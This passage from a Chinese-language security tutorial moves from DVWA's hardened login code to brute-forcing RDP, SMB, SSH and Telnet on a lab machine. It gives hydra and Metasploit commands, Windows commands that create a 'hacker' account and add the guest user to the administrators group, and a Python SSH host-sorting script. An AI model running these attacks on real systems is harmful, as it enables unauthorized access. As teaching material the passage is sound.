punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token comment">// Default values</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token variable">$total_failed_login</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token variable">$lockout_time</span>       <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token variable">$account_locked</span>     <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token comment">// Check the database (Check user information)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token comment">// 获取用户的登录失败次数和最后登录时间</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token comment">// Check to see if the user has been locked out.</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'failed_login'</span> <span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token variable">$total_failed_login</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token comment">// User locked out.  Note, using this method would allow for user enumeration!</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token comment">//echo "&lt;pre>&lt;br />This account has been locked due to too many incorrect logins.&lt;/pre>";</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token comment">// Calculate when the user would be allowed to login again</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token variable">$last_login</span> <span class="token operator">=</span> <span class="token function">strtotime</span><span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'last_login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token variable">$timeout</span>    <span class="token operator">=</span> <span class="token variable">$last_login</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token variable">$lockout_time</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token variable">$timenow</span>    <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token comment">/*</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        print "The last login was: " . date ("h:i:s", $last_login) . "&lt;br />";</pre></td></tr><tr><td data-num="42"></td><td><pre>        print "The timenow is: " . date ("h:i:s", $timenow) . "&lt;br />";</pre></td></tr><tr><td data-num="43"></td><td><pre>        print "The timeout is: " . date ("h:i:s", $timeout) . "&lt;br />";</pre></td></tr><tr><td data-num="44"></td><td><pre>        */</pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token comment">// Check to see if enough time has passed, if it hasn't locked the account</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$timenow</span> <span class="token operator">&lt;</span> <span class="token variable">$timeout</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>            <span class="token variable">$account_locked</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>            <span class="token comment">// print "The account is locked&lt;br />";</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token comment">// Check the database (if username matches the password)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':password'</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token comment">// If its a valid login...</span></pre></td></tr><tr><td data-num="61"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$account_locked</span> <span class="token operator">==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>        <span class="token comment">// Get users details</span></pre></td></tr><tr><td data-num="63"></td><td><pre>        <span class="token variable">$avatar</span>       <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'avatar'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>        <span class="token variable">$failed_login</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'failed_login'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        <span class="token variable">$last_login</span>   <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'last_login'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre></pre></td></tr><tr><td data-num="67"></td><td><pre>        <span class="token comment">// Login successful</span></pre></td></tr><tr><td data-num="68"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Welcome to the password protected area &lt;em><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token punctuation">&#125;</span></span>&lt;/em>&lt;/p>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src=\"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$avatar</span><span class="token punctuation">&#125;</span></span>\" />"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre>        <span class="token comment">// Had the account been locked out since last login?</span></pre></td></tr><tr><td data-num="72"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$failed_login</span> <span class="token operator">>=</span> <span class="token variable">$total_failed_login</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>&lt;em>Warning&lt;/em>: Someone might of been brute forcing your account.&lt;/p>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Number of login attempts: &lt;em><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$failed_login</span><span class="token punctuation">&#125;</span></span>&lt;/em>.&lt;br />Last login attempt was at: &lt;em>$&#123;last_login&#125;&lt;/em>.&lt;/p>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>        <span class="token comment">// Reset bad login count</span></pre></td></tr><tr><td data-num="78"></td><td><pre>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>        <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>        <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>        <span class="token comment">// Login failed</span></pre></td></tr><tr><td data-num="83"></td><td><pre>        <span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="84"></td><td><pre></pre></td></tr><tr><td data-num="85"></td><td><pre>        <span class="token comment">// Give the user some feedback</span></pre></td></tr><tr><td data-num="86"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>&lt;br />Username and/or password incorrect.&lt;br />&lt;br/>Alternative, the account has been locked because of too many failed logins.&lt;br />If this is the case, &lt;em>please try again in <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$lockout_time</span><span class="token punctuation">&#125;</span></span> minutes&lt;/em>.&lt;/pre>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre></pre></td></tr><tr><td data-num="88"></td><td><pre>        <span class="token comment">// Update bad login count</span></pre></td></tr><tr><td data-num="89"></td><td><pre>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="90"></td><td><pre>        <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="91"></td><td><pre>        <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="93"></td><td><pre></pre></td></tr><tr><td data-num="94"></td><td><pre>    <span class="token comment">// Set the last login time</span></pre></td></tr><tr><td data-num="95"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="96"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="97"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="98"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="99"></td><td><pre></pre></td></tr><tr><td data-num="100"></td><td><pre><span class="token comment">// Generate Anti-CSRF token</span></pre></td></tr><tr><td data-num="101"></td><td><pre><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><ol>
<li>POST 登录</li>
<li>对用户名和密码的输入过滤</li>
<li>失败三次，锁定输入 15 分钟，如果用户已被锁定、输入的是正确的用户名和密码会提示有人暴力破解你的账户，并重置账户的登录次数</li>
<li>登录失败时随机睡眠 2-4 秒</li>
<li>带 token 验证</li>
</ol>
<p>目前主流的放爆破措施：</p>
<ol>
<li>验证码：图片验证、拼图验证、滑动验证、人机交互验证</li>
<li>SSO（Single Sign On）：单点登录、统一身份认证</li>
</ol>
<h2 id="系统认证爆破"><a class="anchor" href="#系统认证爆破">#</a> 系统认证爆破</h2>
<h3 id="rdp-爆破3389"><a class="anchor" href="#rdp-爆破3389">#</a> RDP 爆破 (3389)</h3>
<p>RDP 远程桌面协议 (Remote Desktop Protocol)</p>
<p>Windows 命令：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 查看用户详情</span></pre></td></tr><tr><td data-num="2"></td><td><pre>net user administrator</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 修改密码</span></pre></td></tr><tr><td data-num="4"></td><td><pre>net user administrator <span class="token number">123</span>.com</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># 开启 GUEST 来宾用户</span></pre></td></tr><tr><td data-num="6"></td><td><pre>net user guest /active:yes</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment"># 关闭 GUEST 来宾用户</span></pre></td></tr><tr><td data-num="8"></td><td><pre>net user guest /active:no</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment"># 创建一个用户 hacker 密码为：hacker.123</span></pre></td></tr><tr><td data-num="10"></td><td><pre>net user hacker hacker.123 /add</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment"># 查看管理组成员</span></pre></td></tr><tr><td data-num="12"></td><td><pre>net localgroup administrators</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment"># 将 guest 用户添加到管理组</span></pre></td></tr><tr><td data-num="14"></td><td><pre>net localgroup administrators guest /add</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment"># 将 guest 用户从管理组移除</span></pre></td></tr><tr><td data-num="16"></td><td><pre>net localgroup administrators guest /del</pre></td></tr></table></figure><p>目标靶机：Windows Server 2008 R2 with SP1 已开启 RDP</p>
<p><strong>hydra：</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>hydra <span class="token parameter variable">-l</span> Administrator <span class="token parameter variable">-P</span> password.txt <span class="token number">192.168</span>.23.135 rdp <span class="token number">3389</span> <span class="token parameter variable">-vV</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711141520562.png" alt="image-20240711141520562"></p>
<p><strong>SNETCracker：</strong>  <a target="_blank" rel="noopener" href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a></p>
<p><img loading="lazy" data-src="image-20240711142054914.png" alt="image-20240711142054914"></p>
<p>** 御剑 RDP 爆破：**<a target="_blank" rel="noopener" href="https://github.com/foryujian/yujianrdpcrack/tree/5b68c2b0070890f33a1dad1de393706be4372c26">https://github.com/foryujian/yujianrdpcrack/tree/5b68c2b0070890f33a1dad1de393706be4372c26</a></p>
<p><img loading="lazy" data-src="image-20240711142453500.png" alt="image-20240711142453500"></p>
<h3 id="smb爆破445"><a class="anchor" href="#smb爆破445">#</a> SMB 爆破 (445)</h3>
<p>SMB（Server Message Block）协议，用于文件共享、打印服务等。如果有 SMB (445)，SMB 爆破的优先级高于 RDP (3389)</p>
<p><strong>hydra</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>hydra <span class="token parameter variable">-l</span> Administrator <span class="token parameter variable">-P</span> password.txt <span class="token number">192.168</span>.23.135 rdp <span class="token number">3389</span> <span class="token parameter variable">-vV</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711153622887.png" alt="image-20240711153622887"></p>
<p><strong>msf</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>msfconsole</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711154402286.png" alt="image-20240711154402286"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>search smb_login</pre></td></tr><tr><td data-num="2"></td><td><pre>use <span class="token number">0</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711154541022.png" alt="image-20240711154541022"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711154729057.png" alt="image-20240711154729057"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.23.135</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">set</span> SMBUser administrator</pre></td></tr><tr><td data-num="4"></td><td><pre>run</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711154909265.png" alt="image-20240711154909265"></p>
<p><strong>SNETCracker</strong></p>
<p><img loading="lazy" data-src="image-20240711155050674.png" alt="image-20240711155050674"></p>
<h3 id="ssh爆破22"><a class="anchor" href="#ssh爆破22">#</a> SSH 爆破 (22)</h3>
<p>ssh (Secure Shell) 字面意思安全的 shell，用于远程登录或者文件传输。</p>
<p>Windows server 2008 R2 安装 openssh：<a target="_blank" rel="noopener" href="https://github.com/PowerShell/Win32-OpenSSH/releases">https://github.com/PowerShell/Win32-OpenSSH/releases</a></p>
<p>下载.msi 安装包直接安装即可</p>
<p>用 python 编写脚本检查目标主机 ssh 是否设置公钥认证。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> pexpect</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> progressbar</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'22.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>attack_ips <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>p <span class="token operator">=</span> progressbar<span class="token punctuation">.</span>ProgressBar<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>user <span class="token operator">=</span> <span class="token string">'administrator'</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">for</span> line <span class="token keyword">in</span> p<span class="token punctuation">(</span>lines<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    ssh <span class="token operator">=</span> pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'ssh </span><span class="token interpolation"><span class="token punctuation">&#123;</span>user<span class="token punctuation">&#125;</span></span><span class="token string">@</span><span class="token interpolation"><span class="token punctuation">&#123;</span>line<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        flag <span class="token operator">=</span> ssh<span class="token punctuation">.</span>expect<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'continue'</span><span class="token punctuation">,</span> <span class="token string">'password:'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>isnumeric<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            attack_ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">except</span> pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        ssh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">except</span> pexpect<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        ssh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">for</span> ip <span class="token keyword">in</span> attack_ips<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'ssh.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ip<span class="token punctuation">)</span></pre></td></tr></table></figure><p><strong>railgun</strong></p>
<p>一款多功能渗透工具，不限于暴力破解</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lz520520/railgun">https://github.com/lz520520/railgun</a></p>
<p><img loading="lazy" data-src="image-20240711195749518.png" alt="image-20240711195749518"></p>
<p><strong>hydra</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>hydra <span class="token parameter variable">-l</span> Administrator <span class="token parameter variable">-P</span> password.txt <span class="token number">192.168</span>.23.135 <span class="token function">ssh</span> <span class="token number">22</span> <span class="token parameter variable">-vV</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711200040609.png" alt="image-20240711200040609"></p>
<p><strong>msf</strong></p>
<p>msf 提供了公钥登录爆破和数字登录爆破，这里使用数字登录爆破 <code>use 0</code></p>
<p><img loading="lazy" data-src="image-20240711200356442.png" alt="image-20240711200356442"></p>
<p>查看需要配置的参数：</p>
<p><img loading="lazy" data-src="image-20240711200616826.png" alt="image-20240711200616826"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.23.135</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">set</span> USERNAME administrator</pre></td></tr><tr><td data-num="4"></td><td><pre>run</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711200956957.png" alt="image-20240711200956957"></p>
<h3 id="telnet爆破23"><a class="anchor" href="#telnet爆破23">#</a> Telnet 爆破 (23)</h3>
<p>Telnet 主要用于远程登录，很危险的一个端口，漏洞对多，建议关闭</p>
<p><strong>SNETCracker 和 railgun 爆破不出来</strong></p>
<p><strong>hydra</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>hydra <span class="token parameter variable">-l</span> Administrator <span class="token parameter variable">-P</span> /home/kali/password.txt <span class="token number">192.168</span>.23.135 telnet <span class="token number">23</span> <span class="token parameter variable">-vV</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711210744634.png" alt="image-20240711210744634"></p>
<p><strong>msf</strong></p>
